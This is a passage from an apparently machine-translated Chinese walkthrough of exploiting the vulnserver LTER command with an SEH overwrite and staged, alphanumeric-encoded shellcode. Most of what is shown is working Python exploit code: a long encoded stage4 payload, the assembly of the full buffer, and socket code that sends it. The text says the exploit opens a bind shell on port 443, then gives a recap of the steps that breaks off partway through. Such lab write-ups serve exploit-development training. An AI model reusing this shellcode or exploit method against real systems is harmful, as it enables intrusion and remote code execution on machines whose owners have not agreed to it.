"\x05\x14\x31\x32\x73" ## add  eax, 0x73323114<br/>stage4 += "\x05\x14\x22\x31\x63" ## add  eax, 0x63312214<br/>stage4 += "\x05\x14\x21\x32\x53" ## add  eax, 0x53322114<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x42\x41\x17\x33" ## add  eax, 0x33174142<br/>stage4 += "\x05\x32\x41\x16\x23" ## add  eax, 0x23164132<br/>stage4 += "\x05\x32\x31\x15\x23" ## add  eax, 0x23153132<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x50\x33\x71" ## add  eax, 0x71335033<br/>stage4 += "\x05\x22\x50\x23\x60" ## add  eax, 0x60235022<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x23\x12\x13\x67" ## add  eax, 0x67131223<br/>stage4 += "\x05\x13\x02\x14\x67" ## add  eax, 0x67140213<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x12\x22\x57\x33" ## add  eax, 0x33572212<br/>stage4 += "\x05\x22\x21\x46\x23" ## add  eax, 0x23462122<br/>stage4 += "\x05\x12\x22\x45\x22" ## add  eax, 0x22452212<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x71\x63\x41\x63" ## add  eax, 0x63416371<br/>stage4 += "\x05\x62\x52\x41\x53" ## add  eax, 0x53415262<br/>stage4 += "\x05\x51\x62\x31\x32" ## add  eax, 0x32316251<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x42\x36\x63\x76" ## add  eax, 0x76633642<br/>stage4 += "\x05\x42\x25\x53\x65" ## add  eax, 0x65532542<br/>stage4 += "\x05\x42\x24\x63\x54" ## add  eax, 0x54632442<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x52\x32\x31\x42" ## add  eax, 0x42313252<br/>stage4 += "\x05\x52\x42\x40\x41" ## add  eax, 0x41404252<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x71\x76\x63\x10" ## add  eax, 0x10637671<br/>stage4 += "\x05\x70\x65\x62\x10" ## add  eax, 0x10626570<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x26\x57\x66" ## add  eax, 0x66572633<br/>stage4 += "\x05\x32\x26\x46\x55" ## add  eax, 0x55462632<br/>stage4 += "\x05\x32\x24\x45\x46" ## add  eax, 0x46452432<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x55\x61\x40\x33" ## add  eax, 0x33406155<br/>stage4 += "\x05\x44\x51\x40\x32" ## add  eax, 0x32405144<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x51\x34\x73\x66" ## add  eax, 0x66733451<br/>stage4 += "\x05\x40\x24\x74\x66" ## add  eax, 0x66742440<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x36\x33\x64\x56" ## add  eax, 0x56643336<br/>stage4 += "\x05\x45\x24\x54\x55" ## add  eax, 0x55542445<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x46\x73\x13\x61" ## add  eax, 0x61137346<br/>stage4 += "\x05\x45\x63\x03\x61" ## add  eax, 0x61036345<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x70\x50\x76\x30" ## add  eax, 0x30765070<br/>stage4 += "\x05\x60\x50\x75\x40" ## add  eax, 0x40755060<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x03\x23\x72\x73" ## add  eax, 0x73722303<br/>stage4 += "\x05\x02\x12\x71\x62" ## add  eax, 0x62711202<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x32\x37\x12\x14" ## add  eax, 0x14123732<br/>stage4 += "\x05\x32\x27\x01\x14" ## add  eax, 0x14012732<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x21\x16\x46\x74" ## add  eax, 0x74461621<br/>stage4 += "\x05\x21\x15\x35\x64" ## add  eax, 0x64351521<br/>stage4 += "\x05\x21\x16\x33\x54" ## add  eax, 0x54331621<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x47\x66\x32\x25" ## add  eax, 0x25326647<br/>stage4 += "\x05\x46\x56\x31\x24" ## add  eax, 0x24315646<br/>stage4 += "\x05\x35\x64\x22\x24" ## add  eax, 0x24226435<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x53\x04\x66\x62" ## add  eax, 0x62660453<br/>stage4 += "\x05\x42\x04\x56\x61" ## add  eax, 0x61560442<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x76\x47\x26\x66" ## add  eax, 0x66264776<br/>stage4 += "\x05\x66\x47\x15\x56" ## add  eax, 0x56154766<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x42\x13\x42\x47" ## add  eax, 0x47421342<br/>stage4 += "\x05\x32\x22\x42\x46" ## add  eax, 0x46422232<br/>stage4 += "\x05\x32\x12\x42\x35" ## add  eax, 0x35421232<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x76\x01\x70\x67" ## add  eax, 0x67700176<br/>stage4 += "\x05\x65\x01\x70\x56" ## add  eax, 0x56700165<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x13\x27\x66\x26" ## add  eax, 0x26662713<br/>stage4 += "\x05\x23\x16\x65\x26" ## add  eax, 0x26651623<br/>stage4 += "\x05\x13\x25\x46\x24" ## add  eax, 0x24462513<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x61\x11\x32\x30" ## add  eax, 0x30321161<br/>stage4 += "\x05\x61\x01\x41\x20" ## add  eax, 0x20410161<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x16\x63\x74\x66" ## add  eax, 0x66746316<br/>stage4 += "\x05\x26\x53\x64\x55" ## add  eax, 0x55645326<br/>stage4 += "\x05\x14\x33\x53\x34" ## add  eax, 0x34533314<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x55\x43\x73\x71" ## add  eax, 0x71734355<br/>stage4 += "\x05\x55\x43\x73\x61" ## add  eax, 0x61734355<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x64\x64\x67\x43" ## add  eax, 0x43676464<br/>stage4 += "\x05\x54\x53\x56\x33" ## add  eax, 0x33565354<br/>stage4 += "\x05\x63\x63\x35\x33" ## add  eax, 0x33356363<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x55\x62\x16\x15" ## add  eax, 0x15166255<br/>stage4 += "\x05\x55\x61\x05\x15" ## add  eax, 0x15056155<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x11\x26\x66\x56" ## add  eax, 0x56662611<br/>stage4 += "\x05\x10\x16\x65\x45" ## add  eax, 0x45651610<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x57\x74\x60\x57" ## add  eax, 0x57607457<br/>stage4 += "\x05\x47\x74\x50\x47" ## add  eax, 0x47507447<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x71\x56\x73\x35" ## add  eax, 0x35735671<br/>stage4 += "\x05\x60\x45\x63\x45" ## add  eax, 0x45634560<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x76\x76\x16\x43" ## add  eax, 0x43167676<br/>stage4 += "\x05\x65\x65\x26\x32" ## add  eax, 0x32266565<br/>stage4 += "\x05\x54\x54\x14\x32" ## add  eax, 0x32145454<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x35\x61\x22" ## add  eax, 0x22613533<br/>stage4 += "\x05\x43\x25\x50\x22" ## add  eax, 0x22502543<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x54\x67\x11\x71" ## add  eax, 0x71116754<br/>stage4 += "\x05\x54\x67\x10\x71" ## add  eax, 0x71106754<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x13\x63\x71\x54" ## add  eax, 0x54716313<br/>stage4 += "\x05\x02\x52\x61\x44" ## add  eax, 0x44615202<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x75\x67\x55\x35" ## add  eax, 0x35556775<br/>stage4 += "\x05\x75\x57\x45\x25" ## add  eax, 0x25455775<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x13\x67\x37\x37" ## add  eax, 0x37376713<br/>stage4 += "\x05\x04\x57\x26\x26" ## add  eax, 0x26265704<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x63\x11\x11\x31" ## add  eax, 0x31111163<br/>stage4 += "\x05\x63\x21\x21\x32" ## add  eax, 0x32212163<br/>stage4 += "\x05\x43\x11\x11\x21" ## add  eax, 0x21111143<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x14\x41\x60\x14" ## add  eax, 0x14604114<br/>stage4 += "\x05\x04\x40\x50\x04" ## add  eax, 0x04504004<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x17\x23\x26\x55" ## add  eax, 0x55262317<br/>stage4 += "\x05\x06\x14\x15\x55" ## add  eax, 0x55151406<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x37\x12\x53" ## add  eax, 0x53123733<br/>stage4 += "\x05\x32\x47\x11\x52" ## add  eax, 0x52114732<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x25\x36\x40\x31" ## add  eax, 0x31403625<br/>stage4 += "\x05\x15\x26\x40\x30" ## add  eax, 0x30402615<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x26\x37\x07\x75" ## add  eax, 0x75073726<br/>stage4 += "\x05\x15\x36\x06\x74" ## add  eax, 0x74063615<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x53\x72\x74\x15" ## add  eax, 0x15747253<br/>stage4 += "\x05\x42\x72\x74\x04" ## add  eax, 0x04747242<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x67\x63\x32\x31" ## add  eax, 0x31326367<br/>stage4 += "\x05\x66\x62\x22\x22" ## add  eax, 0x22226266<br/>stage4 += "\x05\x45\x42\x22\x21" ## add  eax, 0x21224245<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x52\x31\x32\x12" ## add  eax, 0x12323152<br/>stage4 += "\x05\x41\x30\x21\x12" ## add  eax, 0x12213041<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x36\x44\x11\x36" ## add  eax, 0x36114436<br/>stage4 += "\x05\x35\x44\x12\x35" ## add  eax, 0x35124435<br/>stage4 += "\x05\x36\x33\x11\x33" ## add  eax, 0x33113336<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x57\x33\x60\x16" ## add  eax, 0x16603357<br/>stage4 += "\x05\x46\x42\x60\x15" ## add  eax, 0x15604246<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x37\x10\x17\x11" ## add  eax, 0x11171037<br/>stage4 += "\x05\x27\x10\x07\x01" ## add  eax, 0x01071027<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x66\x61\x47\x41" ## add  eax, 0x41476166<br/>stage4 += "\x05\x56\x61\x36\x41" ## add  eax, 0x41366156<br/>stage4 += "\x05\x64\x41\x35\x41" ## add  eax, 0x41354164<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x34\x63\x21\x17" ## add  eax, 0x17216334<br/>stage4 += "\x05\x23\x53\x21\x16" ## add  eax, 0x16215323<br/>stage4 += "\x05\x23\x63\x21\x15" ## add  eax, 0x15216323<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x21\x24\x27\x53" ## add  eax, 0x53272421<br/>stage4 += "\x05\x12\x14\x26\x43" ## add  eax, 0x43261412<br/>stage4 += "\x05\x21\x24\x25\x43" ## add  eax, 0x43252421<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x25\x36\x46\x16" ## add  eax, 0x16463625<br/>stage4 += "\x05\x24\x45\x45\x16" ## add  eax, 0x16454524<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x44\x67\x63\x41" ## add  eax, 0x41636744<br/>stage4 += "\x05\x34\x56\x53\x41" ## add  eax, 0x41535634<br/>stage4 += "\x05\x34\x65\x42\x31" ## add  eax, 0x31426534<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x24\x46\x46\x57" ## add  eax, 0x57464624<br/>stage4 += "\x05\x24\x45\x45\x46" ## add  eax, 0x46454524<br/>stage4 += "\x05\x24\x33\x34\x45" ## add  eax, 0x45343324<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x11\x34\x46" ## add  eax, 0x46341133<br/>stage4 += "\x05\x32\x12\x34\x45" ## add  eax, 0x45341232<br/>stage4 += "\x05\x22\x11\x34\x46" ## add  eax, 0x46341122<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x13\x76\x41\x36" ## add  eax, 0x36417613<br/>stage4 += "\x05\x23\x65\x42\x36" ## add  eax, 0x36426523<br/>stage4 += "\x05\x13\x56\x41\x24" ## add  eax, 0x24415613<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x07\x02\x21\x55" ## add  eax, 0x55210207<br/>stage4 += "\x05\x07\x01\x20\x54" ## add  eax, 0x54200107<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x63\x02\x21\x33" ## add  eax, 0x33210263<br/>stage4 += "\x05\x64\x02\x10\x24" ## add  eax, 0x24100264<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x65\x61\x32\x42" ## add  eax, 0x42326165<br/>stage4 += "\x05\x64\x50\x21\x41" ## add  eax, 0x41215064<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x54\x73\x16\x26" ## add  eax, 0x26167354<br/>stage4 += "\x05\x43\x62\x15\x15" ## add  eax, 0x15156243<br/>stage4 += "\x05\x43\x52\x13\x23" ## add  eax, 0x23135243<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x45\x73\x65\x13" ## add  eax, 0x13657345<br/>stage4 += "\x05\x44\x74\x55\x03" ## add  eax, 0x03557444<br/>stage4 += "\x50"                 ## push eax</span><span id="2ae1" class="nz kc it ma b gy ox ob l oc od">payload = ""<br/>payload += vuln_command<br/>payload += stage4<br/>payload += "A" * (offset - len(stage1) - 73 - len(stage4))<br/>payload += stage3<br/>payload += "B" * (73 - len(stage3))<br/>payload += stage1<br/>payload += seh<br/>payload += "C" * 2<br/>payload += stage2<br/>payload += "C" * (crash - 4 - offset - 2 - len(stage2))</span><span id="10be" class="nz kc it ma b gy ox ob l oc od">print "[+] Sending buffer (Size: %d)" % len(payload)</span><span id="5394" class="nz kc it ma b gy ox ob l oc od">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>s.connect(('127.0.0.1', 9999))<br/>print(s.recv(1024))<br/>s.send(payload)<br/>s.close()</span></pre><p id="367a" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">一旦我们运行了<code class="fe lx ly lz ma b">final_lter.py</code>脚本，我们就可以成功地在端口443上打开bind shell。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pn"><img src="../Images/6b0bb6bf21fff91b5615a783c832a6a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8GDMUGMInCdCjfRUC0kAwQ.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">最终利用</figcaption></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="77e6" class="kb kc it bd kd ke mi kg kh ki mj kk kl km mk ko kp kq ml ks kt ku mm kw kx ky bi translated">结论</h1><p id="eab6" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">概括一下:</p><ol class=""><li id="8954" class="mn mo it lb b lc nb lg nc lk ni lo nj ls nk lw po mt mu mv bi translated">我们模糊了vulnserver <code class="fe lx ly lz ma b">LTER</code>命令。</li><li id="1979" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw po mt mu mv bi translated">找到了<code class="fe lx ly lz ma b">LTER</code>有漏洞命令的入口点。</li><li id="0589" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw po mt mu mv bi translated">已识别不良字符。</li><li id="b7a6" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw po mt mu mv bi translated">找到控制<code class="fe lx ly lz ma b">SEH</code>覆盖的偏移量。</li><li id="7ec0" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw po mt mu mv bi translated">发现不良字符免费<code class="fe lx ly lz ma b">POP POP RET</code>小工具地址。</li><li id="8627" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw po mt mu mv bi translated"><strong class="lb iu"> [#1阶段Shellcode] </strong>条件JMP ( <code class="fe lx ly lz ma b">nSEH</code>)带4字节。</li><li id="7863" class="mn mo it lb b lc mw lg mx lk my lo mz ls 